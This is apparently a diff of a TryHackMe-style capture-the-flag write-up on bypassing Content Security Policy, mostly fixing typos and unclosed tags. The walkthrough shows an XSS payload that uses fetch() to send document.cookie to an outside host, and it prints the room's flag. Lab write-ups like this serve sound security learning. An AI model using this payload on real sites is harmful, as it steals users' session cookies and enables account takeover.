@@ -155,8 +155,6 @@ When the script is triggered on the victim's machine, you'll see their cookies s
 <img width="1005" height="166" alt="image" src="https://github.com/user-attachments/assets/6c965f4b-559e-450b-828c-1e4baac99569" /><br><br>
 
 If you found an XSS vulnerability and bypassed CSP, but can't leak any information with it via XHR requests or fetch, the <code>connect-src</code> policy may be blocking your requests. This can be bypassed if the website you're exploiting doesn't have strict settings for directives such as image-src and media-src, which can be abused to leak information.<br><br>
-<br>
-<br>
 
 <img width="1012" height="47" alt="image" src="https://github.com/user-attachments/assets/0c03034b-feb6-4cd4-b27a-0e79fb3b043a" />
 
@@ -206,14 +204,14 @@ You can access the introduction at http://xx.xxx.xxx.xxx/. </p>
 
 <p>
 
-- navigated to <code>https://csp-evaluator.withgoogle.com</code> to checke if the policy has any potential bypass vectors in it<br>
+- navigated to <code>https://csp-evaluator.withgoogle.com</code> to check if the policy has any potential bypass vectors in it<br>
 - pasted <code>xx.xxx.xxx.xxx:30001</code><br>
-- clicked <code>CHECK CSP<br>
-- identified that there is <code>default-src<br>: <code>*</code> and <code>‘unsafe-inline’</code><br>
-- reviewd that the directive <code>default-src<br> is used as the default, which means if a certain resource is trying to be loaded and there isn't a directive specified for its type, it falls back to default-src to verify if it's allowed to load.<br>
+- clicked <code>CHECK CSP</code><br>
+- identified that there is <code>default-src</code><br>: <code>*</code> and <code>‘unsafe-inline’</code><br>
+- checked and identified that the directive <code>default-src</code><br> is used as the default, which means if a certain resource is trying to be loaded and there isn't a directive specified for its type, it falls back to default-src to verify if it's allowed to load.<br>
 - set up an http.server<br>>
-- type a payload <code><script>fetch(`http://10.201.25.139:8000/${document.cookie}`)</script></code><br>
-- clicked <code>Submit Query</code.<br>
+- typed a payload <code><script>fetch(`http://10.201.25.139:8000/${document.cookie}`)</script></code><br>
+- clicked <code>Submit Query</code><br>
 - received the flag and URL decoded it: <code>THM%7BTh4t_W4s_Pr3tty_3asy%7D</code> = <code>THM{Th4t_W4s_Pr3tty_3asy}</code></p>
 
 <br>
